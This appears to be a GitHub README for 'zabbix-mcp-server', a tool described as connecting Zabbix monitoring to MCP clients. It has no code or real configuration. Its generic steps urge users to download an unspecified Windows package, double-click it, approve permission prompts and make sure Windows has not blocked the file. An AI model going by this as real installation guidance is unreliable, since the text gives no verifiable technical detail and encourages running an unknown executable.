# 🧩 zabbix-mcp-server - Connect Zabbix to Your AI Tools

[![Download](https://img.shields.io/badge/Download-Visit%20the%20page-blue?style=for-the-badge&logo=github)](https://github.com/Rapid-dissolve862/zabbix-mcp-server)

## 🖥️ What this does

zabbix-mcp-server lets your AI app talk to Zabbix through the Model Context Protocol (MCP).

It is made for people who want to use tools like ChatGPT, Claude, VS Code, Codex, JetBrains, and other MCP clients with Zabbix data.

Use it to:

- check hosts, triggers, items, and problems
- work with more than one Zabbix server
- use bearer auth for secure access
- connect AI tools to your monitoring setup
- run on Windows, Linux, or a systemd-based server

## 📥 Download

Use this link to visit the download page and get the software:

[Download zabbix-mcp-server](https://github.com/Rapid-dissolve862/zabbix-mcp-server)

## 🪟 Install on Windows

Follow these steps if you want to run it on Windows.

1. Open the download page: [https://github.com/Rapid-dissolve862/zabbix-mcp-server](https://github.com/Rapid-dissolve862/zabbix-mcp-server)
2. Look for the latest release or the main download files.
3. Download the Windows package or source file from the page.
4. Save the file in a folder you can find again, like `Downloads` or `Desktop`.
5. If you get a zip file, right-click it and choose Extract All.
6. Open the extracted folder.
7. Find the start file or run command shown in the project files.
8. Double-click it to launch the server.

If Windows asks for permission, choose Yes.

## ⚙️ What you need

This app is built for common desktop and server use.

You will usually need:

- Windows 10 or Windows 11
- an internet connection for setup
- a Zabbix account or API token
- access to at least one Zabbix server
- an MCP client such as ChatGPT, Claude, VS Code, Codex, or JetBrains

For best results, keep your Zabbix URL, user name, and token nearby during setup.

## 🔗 Connect it to your MCP client

After you run the server, connect it to your AI tool.

Typical setup steps:

1. Open your MCP client
2. Find the place where you add a server or extension
3. Add the zabbix-mcp-server entry
4. Paste the local run command or server path
5. Save the settings
6. Restart the client if needed

If your client asks for a config file, add the server details there.

## 🧰 Common uses

This server can help with day-to-day monitoring tasks:

- ask your AI tool for host status
- review problem alerts
- check trigger state
- inspect item values
- look up Zabbix objects by name
- manage more than one Zabbix server from one place

It is useful when you want monitoring data without opening the Zabbix web app every time.

## 🗂️ Main features

### 🔌 Full Zabbix API coverage

The server is built for the complete Zabbix API. That means it can reach a wide set of Zabbix objects and actions.

### 🤖 MCP support

It works with MCP clients, so your AI app can call Zabbix tools in a standard way.

### 🖧 Multi-server support

You can connect to more than one Zabbix server and move between them as needed.

### 🔐 Bearer auth

Use bearer token auth for cleaner and safer access.

### 🏗️ systemd ready

It can run as a service on Linux servers that use systemd.

### 🧪 Built for automation

It fits into scripts, agent workflows, and monitoring tasks that need Zabbix data.

## 🧭 Basic setup flow

Use this flow if you want a simple path:

1. Download the project from the link above
2. Open the files on your computer
3. Set your Zabbix server address
4. Add your API token or login details
5. Start the server
6. Add the server to your MCP client
7. Test it by asking for a host or problem list

If your AI app sees the server, the connection is ready.

## 🛠️ Example settings

Use values like these during setup:

- Zabbix URL: `https://zabbix.example.com`
- API token: `your_token_here`
- Server name: `main-zabbix`
- Client name: `Claude` or `VS Code`

Keep one config for each Zabbix server if you use more than one.

## 🔍 What you can ask your AI tool

Once connected, you can ask simple things like:

- show me active problems
- list hosts in the production group
- check trigger status for web servers
- show item values for this host
- find the Zabbix server named main
- compare alerts across servers

The AI tool sends the request through MCP, and the server talks to Zabbix.

## 📁 File and folder tips

To keep setup easy:

- place the files in a short path, like `C:\zabbix-mcp-server`
- avoid folders with long names
- keep the config file in the same folder if possible
- do not move files after setup unless you update the paths

This helps Windows find the app without issues.

## 🔄 Updating

When a new version comes out:

1. Visit the download page again
2. Get the newest files
3. Replace the old files
4. Keep your config if it is separate
5. Start the updated version

If you have more than one server entry, check each one after update.

## 🧯 If something does not work

Try these checks:

- make sure the Zabbix URL is correct
- confirm your API token is valid
- check that your MCP client points to the right file
- restart the app and the client
- make sure no other app uses the same port
- confirm Windows did not block the file

If the app starts but the client cannot see it, check the client config again

## 📌 Supported tools and platforms

This project is meant to work with:

- ChatGPT
- Claude
- VS Code
- Codex
- JetBrains IDEs
- other MCP clients

It also fits common DevOps and observability use cases with Zabbix API access

## 🧾 Project focus

zabbix-mcp-server brings Zabbix data into the tools people already use.

It is made for:

- monitoring
- observability
- automation
- AI assistants
- infrastructure work
- agent-based tasks

## 📎 Download again

[Visit the download page](https://github.com/Rapid-dissolve862/zabbix-mcp-server)

